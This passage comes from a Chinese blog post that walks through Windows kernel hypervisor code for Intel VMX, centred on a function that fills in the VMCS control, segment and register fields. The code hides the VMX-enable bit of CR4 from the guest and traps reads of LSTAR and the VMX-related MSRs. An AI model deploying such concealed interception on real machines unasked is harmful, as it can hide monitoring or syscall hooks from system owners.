class="line"></span><br><span class="line">    <span class="comment">// VMX Root模式启动, 以及一个激活的VMCS.</span></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="设置VMCS字段"><a href="#设置VMCS字段" class="headerlink" title="设置VMCS字段"></a>设置VMCS字段</h5><p><img src="/.io//e29d346719df43fd8b7c9363083f23e6.png" alt="在这里插入图片描述"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Setup VMCS fields</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;VpData&quot;&gt;Virtual CPU data&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">VmxSetupVMCS</span><span class="params">( IN PVCPU VpData )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PKPROCESSOR_STATE state = &amp;VpData-&gt;HostState;</span><br><span class="line">    VMX_GDTENTRY64 vmxGdtEntry = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    VMX_VM_ENTER_CONTROLS vmEnterCtlRequested = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    VMX_VM_EXIT_CONTROLS vmExitCtlRequested = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    VMX_PIN_BASED_CONTROLS vmPinCtlRequested = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    VMX_CPU_BASED_CONTROLS vmCpuCtlRequested = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    VMX_SECONDARY_CPU_BASED_CONTROLS vmCpuCtl2Requested = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Hypervisor（超级监控程序）是一种虚拟化技术的关键组成部分。</span></span><br><span class="line"><span class="comment">    它是在物理计算机上创建和管理虚拟机（Virtual Machine，VM）的软件或固件。</span></span><br><span class="line"><span class="comment">    Hypervisor 在物理硬件和虚拟机之间充当中间层，允许多个虚拟机同时在同一台物理机上运行，</span></span><br><span class="line"><span class="comment">    并提供虚拟机对硬件资源的访问。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Hypervisor 有两种主要类型：</span></span><br><span class="line"><span class="comment">        直接运行在物理硬件上，它可以直接管理物理资源和虚拟机实例，将物理资源划分给各个虚拟机，</span></span><br><span class="line"><span class="comment">    并在它们之间进行调度和隔离。常见的类型 1 Hypervisor 包括 VMware ESXi、Microsoft Hyper-V 和 Xen。</span></span><br><span class="line"><span class="comment">        作为一个应用程序在操作系统之上运行。它需要一个宿主操作系统提供硬件访问和资源管理功能，</span></span><br><span class="line"><span class="comment">    然后在其上创建和管理虚拟机。常见的类型 2 Hypervisor 包括 Oracle VirtualBox 和 VMware Workstation。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进入控制字段，虚拟机在进入hypervisor时确保以x64模式进入</span></span><br><span class="line">    vmEnterCtlRequested.Fields.IA32eModeGuest = TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 退出控制字段，虚拟机退出hypervisor时，确保以x64模式退出</span></span><br><span class="line">    vmExitCtlRequested.Fields.AcknowledgeInterruptOnExit = TRUE;</span><br><span class="line">    vmExitCtlRequested.Fields.HostAddressSpaceSize = TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 虚拟机CPU控制字段，启用MSR位图，激活次级控制和CR3退出，在CR3改变时无效VPID缓存</span></span><br><span class="line">    vmCpuCtlRequested.Fields.UseMSRBitmaps = TRUE;</span><br><span class="line">    vmCpuCtlRequested.Fields.ActivateSecondaryControl = TRUE;</span><br><span class="line">    <span class="comment">//vmCpuCtlRequested.Fields.UseTSCOffseting = TRUE;</span></span><br><span class="line">    <span class="comment">//vmCpuCtlRequested.Fields.RDTSCExiting = TRUE;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// VPID caches must be invalidated on CR3 change</span></span><br><span class="line">    <span class="keyword">if</span>(g_Data-&gt;Features.VPID)</span><br><span class="line">        vmCpuCtlRequested.Fields.CR3LoadExiting = TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在虚拟机中启用对于 RDTSCP 和 XSAVES/XRESTORES 指令的支持。</span></span><br><span class="line"><span class="comment">    在 Windows 10 系统中，如果 CPU 支持这些指令，操作系统会使用它们来提高性能。</span></span><br><span class="line"><span class="comment">    通过使用 VmxpAdjustMsr 函数，如果处理器不支持这些指令，将会忽略对这些选项的设置。</span></span><br><span class="line"><span class="comment">    这样可以确保在不支持这些指令的处理器上仍然可以正常运行虚拟机监控程序，</span></span><br><span class="line"><span class="comment">    而不会因为这些指令的不支持而导致错误。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    vmCpuCtl2Requested.Fields.EnableRDTSCP = TRUE;</span><br><span class="line">    vmCpuCtl2Requested.Fields.EnableXSAVESXSTORS = TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Begin by setting the link pointer to the required value for 4KB VMCS.</span></span><br><span class="line">    <span class="comment">// 从设置VMCS的链接指针字段开始，设置为4KB VMCS所需的值</span></span><br><span class="line">    __vmx_vmwrite( VMCS_LINK_POINTER, MAXULONG64 );</span><br><span class="line">    <span class="comment">// 将VMCS需要的各个控制字段写入VMCS</span></span><br><span class="line">    __vmx_vmwrite(</span><br><span class="line">        PIN_BASED_VM_EXEC_CONTROL, </span><br><span class="line">        <span class="built_in">VmxpAdjustMsr</span>( VpData-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_TRUE_PINBASED_CTLS )], vmPinCtlRequested.All ) </span><br><span class="line">        );</span><br><span class="line">    __vmx_vmwrite( </span><br><span class="line">        CPU_BASED_VM_EXEC_CONTROL, </span><br><span class="line">        <span class="built_in">VmxpAdjustMsr</span>( VpData-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_TRUE_PROCBASED_CTLS )], vmCpuCtlRequested.All ) </span><br><span class="line">        );</span><br><span class="line">    __vmx_vmwrite( </span><br><span class="line">        SECONDARY_VM_EXEC_CONTROL, </span><br><span class="line">        <span class="built_in">VmxpAdjustMsr</span>( VpData-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_PROCBASED_CTLS2 )], vmCpuCtl2Requested.All ) </span><br><span class="line">        );</span><br><span class="line">    __vmx_vmwrite(</span><br><span class="line">        VM_EXIT_CONTROLS, </span><br><span class="line">        <span class="built_in">VmxpAdjustMsr</span>( VpData-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_TRUE_EXIT_CTLS )], vmExitCtlRequested.All ) </span><br><span class="line">        );</span><br><span class="line">    __vmx_vmwrite( </span><br><span class="line">        VM_ENTRY_CONTROLS, </span><br><span class="line">        <span class="built_in">VmxpAdjustMsr</span>( VpData-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_TRUE_ENTRY_CTLS )], vmEnterCtlRequested.All ) </span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载MSR位图</span></span><br><span class="line">    PUCHAR bitMapReadLow = g_Data-&gt;MSRBitmap;       <span class="comment">// 0x00000000 - 0x00001FFF</span></span><br><span class="line">    PUCHAR bitMapReadHigh = bitMapReadLow + <span class="number">1024</span>;   <span class="comment">// 0xC0000000 - 0xC0001FFF</span></span><br><span class="line"></span><br><span class="line">    RTL_BITMAP bitMapReadLowHeader = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    RTL_BITMAP bitMapReadHighHeader = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlInitializeBitMap</span>( &amp;bitMapReadLowHeader, (PULONG)bitMapReadLow, <span class="number">1024</span> * <span class="number">8</span> );</span><br><span class="line">    <span class="built_in">RtlInitializeBitMap</span>( &amp;bitMapReadHighHeader, (PULONG)bitMapReadHigh, <span class="number">1024</span> * <span class="number">8</span> );</span><br><span class="line">    <span class="comment">// 设置需要捕获的MSR</span></span><br><span class="line">    <span class="built_in">RtlSetBit</span>( &amp;bitMapReadLowHeader, MSR_IA32_FEATURE_CONTROL );    <span class="comment">// MSR_IA32_FEATURE_CONTROL</span></span><br><span class="line">    <span class="built_in">RtlSetBit</span>( &amp;bitMapReadLowHeader,  MSR_IA32_DEBUGCTL );          <span class="comment">// MSR_DEBUGCTL</span></span><br><span class="line">    <span class="built_in">RtlSetBit</span>( &amp;bitMapReadHighHeader, MSR_LSTAR - <span class="number">0xC0000000</span> );     <span class="comment">// MSR_LSTAR</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// VMX MSRs</span></span><br><span class="line">    <span class="keyword">for</span> (ULONG i = MSR_IA32_VMX_BASIC; i &lt;= MSR_IA32_VMX_VMFUNC; i++)</span><br><span class="line">        <span class="built_in">RtlSetBit</span>( &amp;bitMapReadLowHeader, i );</span><br><span class="line"></span><br><span class="line">    __vmx_vmwrite( MSR_BITMAP, <span class="built_in">MmGetPhysicalAddress</span>( g_Data-&gt;MSRBitmap ).QuadPart );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置异常位图 Exception bitmap，捕获断点异常</span></span><br><span class="line">    ULONG ExceptionBitmap = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//ExceptionBitmap |= 1 &lt;&lt; VECTOR_DEBUG_EXCEPTION;</span></span><br><span class="line">    ExceptionBitmap |= <span class="number">1</span> &lt;&lt; VECTOR_BREAKPOINT_EXCEPTION;</span><br><span class="line"></span><br><span class="line">    __vmx_vmwrite( EXCEPTION_BITMAP, ExceptionBitmap );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CS (Ring 0 Code)</span></span><br><span class="line">    <span class="comment">// 代码段描述符中包含了代码段的基地址和大小，并且还包含了一些权限信息。CS 寄存器存放的是代码段描述符在 GDT 表中的索引（Selector）。</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegCs, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_CS_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_CS_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_CS_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_CS_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_CS_SELECTOR, state-&gt;ContextFrame.SegCs &amp; ~RPL_MASK );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SS (Ring 0 Data)</span></span><br><span class="line">    <span class="comment">// 栈段描述符中包含了栈段的基地址和大小，并且还包含了一些权限信息。SS 寄存器存放的是栈段描述符在 GDT 表中的索引（Selector）。</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegSs, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_SS_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_SS_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_SS_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_SS_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_SS_SELECTOR, state-&gt;ContextFrame.SegSs &amp; ~RPL_MASK );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// DS (Ring 3 Data)</span></span><br><span class="line">    <span class="comment">// 数据段描述符中包含了数据段的基地址和大小，并且还包含了一些权限信息。DS、ES、FS、GS 寄存器分别存放数据段描述符在 GDT 表中的索引（Selector）。</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegDs, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_DS_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_DS_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_DS_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_DS_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_DS_SELECTOR, state-&gt;ContextFrame.SegDs &amp; ~RPL_MASK );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ES (Ring 3 Data)</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegEs, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_ES_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_ES_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_ES_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_ES_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_ES_SELECTOR, state-&gt;ContextFrame.SegEs &amp; ~RPL_MASK );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FS (Ring 3 Compatibility-Mode TEB)</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegFs, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_FS_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_FS_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_FS_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_FS_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_FS_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_FS_SELECTOR, state-&gt;ContextFrame.SegFs &amp; ~RPL_MASK );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GS (Ring 3 Data if in Compatibility-Mode, MSR-based in Long Mode)</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegGs, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_GS_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_GS_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_GS_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_GS_BASE, state-&gt;SpecialRegisters.MsrGsBase );</span><br><span class="line">    __vmx_vmwrite( HOST_GS_BASE, state-&gt;SpecialRegisters.MsrGsBase );</span><br><span class="line">    __vmx_vmwrite( HOST_GS_SELECTOR, state-&gt;ContextFrame.SegGs &amp; ~RPL_MASK );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Task Register (Ring 0 TSS)</span></span><br><span class="line">    <span class="comment">// 存放任务状态段 (TSS) 的选择符，在进行任务切换时使用。</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;SpecialRegisters.Tr, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_TR_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_TR_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_TR_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_TR_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_TR_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_TR_SELECTOR, state-&gt;SpecialRegisters.Tr &amp; ~RPL_MASK );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LDT</span></span><br><span class="line">    <span class="comment">// 进程的局部任务表描述符（LDT），存放 LDT 描述符在 GDT 表中的索引（Selector）。</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;SpecialRegisters.Ldtr, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_LDTR_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_LDTR_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_LDTR_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_LDTR_BASE, vmxGdtEntry.Base );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GDT</span></span><br><span class="line">    <span class="comment">// 全局描述符表 (GDT)，存放系统运行过程中所有描述符的表。GDT 表包含了各种类型的描述符，如代码段描述符、数据段描述符、TSS 描述符等。</span></span><br><span class="line">    __vmx_vmwrite( GUEST_GDTR_BASE, (ULONG_PTR)state-&gt;SpecialRegisters.Gdtr.Base );</span><br><span class="line">    __vmx_vmwrite( GUEST_GDTR_LIMIT, state-&gt;SpecialRegisters.Gdtr.Limit );</span><br><span class="line">    __vmx_vmwrite( HOST_GDTR_BASE, (ULONG_PTR)state-&gt;SpecialRegisters.Gdtr.Base );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IDT</span></span><br><span class="line">    <span class="comment">// 中断描述符表(IDT)，存放中断处理程序的入口地址，当中断发生时 CPU 会根据中断号查找该表并跳转到对应的处理程序。</span></span><br><span class="line">    __vmx_vmwrite( GUEST_IDTR_BASE, (ULONG_PTR)state-&gt;SpecialRegisters.Idtr.Base );</span><br><span class="line">    __vmx_vmwrite( GUEST_IDTR_LIMIT, state-&gt;SpecialRegisters.Idtr.Limit );</span><br><span class="line">    __vmx_vmwrite( HOST_IDTR_BASE, (ULONG_PTR)state-&gt;SpecialRegisters.Idtr.Base );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CR0</span></span><br><span class="line">    <span class="comment">// 包含了控制处理器运行方式和操作系统的特定行为的控制位，比如保护模式、分页机制等。</span></span><br><span class="line">    __vmx_vmwrite( CR0_READ_SHADOW, state-&gt;SpecialRegisters.Cr0 );</span><br><span class="line">    __vmx_vmwrite( HOST_CR0, state-&gt;SpecialRegisters.Cr0 );</span><br><span class="line">    __vmx_vmwrite( GUEST_CR0, state-&gt;SpecialRegisters.Cr0 );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CR3</span></span><br><span class="line">    <span class="comment">// 存放页面目录表 (Page Directory Table) 的地址，页面目录表描述了虚拟地址空间和物理地址空间的映射关系。</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    “不要使用当前进程的地址空间作为 host”，因为此时可能正在任意的用户模式进程中执行，</span></span><br><span class="line"><span class="comment">    这里的 host 指的是 hypervisor。也就是说，当 hypervisor 在处理 DPC 中断时，</span></span><br><span class="line"><span class="comment">    DPC 可能正在运行某个用户进程的上下文中，没有特权访问 CR3 寄存器来获取当前进程的页目录表或页表。</span></span><br><span class="line"><span class="comment">    因此，需要手动映射一份特殊的地址空间（例如 kernel 物理地址空间）作为 hypervisor 的地址空间，</span></span><br><span class="line"><span class="comment">    并将其指定为 CR3 的值。这里做了这样的优化，避免使用错误的地址空间导致虚拟地址到物理地址的解析错误。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    __vmx_vmwrite( HOST_CR3, VpData-&gt;SystemDirectoryTableBase );</span><br><span class="line">    __vmx_vmwrite( GUEST_CR3, state-&gt;SpecialRegisters.Cr3 );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CR4</span></span><br><span class="line">    <span class="comment">// 包含了一些高级控制和特征寄存器（Advanced Controls and Features Register），比如支持硬件虚拟化技术、支持大页面等。</span></span><br><span class="line">    __vmx_vmwrite( HOST_CR4, state-&gt;SpecialRegisters.Cr4 );</span><br><span class="line">    __vmx_vmwrite( GUEST_CR4, state-&gt;SpecialRegisters.Cr4 );</span><br><span class="line">    __vmx_vmwrite( CR4_GUEST_HOST_MASK, <span class="number">0x2000</span> );</span><br><span class="line">    __vmx_vmwrite( CR4_READ_SHADOW, state-&gt;SpecialRegisters.Cr4 &amp; ~<span class="number">0x2000</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Debug MSR and DR7</span></span><br><span class="line">    <span class="comment">// 包含有关调试状态和断点设置的信息。通过这些寄存器，可以在 CPU 上设置断点和调试相关信息。</span></span><br><span class="line">    __vmx_vmwrite( GUEST_IA32_DEBUGCTL, state-&gt;SpecialRegisters.DebugControl );</span><br><span class="line">    __vmx_vmwrite( GUEST_DR7, state-&gt;SpecialRegisters.KernelDr7 );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    最后，加载客户机的堆栈、指令指针和标志寄存器，</span></span><br><span class="line"><span class="comment">    这与 RtlCaptureContext 在 VmxInitializeCPU 中返回的位置完全对应。</span></span><br><span class="line"><span class="comment">    这段代码的作用是将保存在特定位置的客户机上下文数据加载到相应的寄存器中，</span></span><br><span class="line"><span class="comment">    以便恢复客户机的执行状态。具体来说，它加载了客户机的堆栈指针、指令指针和标志寄存器值，</span></span><br><span class="line"><span class="comment">    使得当控制权返回到 VmxInitializeCPU 时，客户机可以继续执行。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    __vmx_vmwrite( GUEST_RSP, state-&gt;ContextFrame.Rsp );</span><br><span class="line">    __vmx_vmwrite( GUEST_RIP, state-&gt;ContextFrame.Rip );</span><br><span class="line">    __vmx_vmwrite( GUEST_RFLAGS, state-&gt;ContextFrame.EFlags );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    加载 hypervisor 的入口地址和 hypervisor 栈。我们为自己分配了一个标准大小的内核栈（24KB），</span></span><br><span class="line"><span class="comment">    并偏移指向上下文结构的指针，从而避免在 entrypoint 中需要修改叠加寄存器 RSP 的指令。</span></span><br><span class="line"><span class="comment">    注意 CONTEXT 指针和栈本身必须按照 16 字节对齐，以保证与 AMD64 架构的 ABI 兼容性。</span></span><br><span class="line"><span class="comment">    否则，诸如 RtlCaptureContext 将执行的 XMM 操作等操作将会失败。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">NT_ASSERT</span>( (KERNEL_STACK_SIZE - <span class="built_in">sizeof</span>( CONTEXT )) % <span class="number">16</span> == <span class="number">0</span> );</span><br><span class="line">    __vmx_vmwrite( HOST_RSP, (ULONG_PTR)VpData-&gt;VMMStack + KERNEL_STACK_SIZE - <span class="built_in">sizeof</span>( CONTEXT ) );</span><br><span class="line">    <span class="comment">// 将当前状态存储在栈中，并跳转到一个 C 函数 VmxpExitHandler 中去处理 VM 的 exit 事件</span></span><br><span class="line">    __vmx_vmwrite( HOST_RIP, (ULONG_PTR)VmxVMEntry );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="将GDT（全局描述符表）中的段信息转换为VMX（虚拟机扩展）所需的格式"><a href="#将GDT（全局描述符表）中的段信息转换为VMX（虚拟机扩展）所需的格式" class="headerlink" title="将GDT（全局描述符表）中的段信息转换为VMX（虚拟机扩展）所需的格式"></a>将GDT（全局描述符表）中的段信息转换为VMX（虚拟机扩展）所需的格式</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 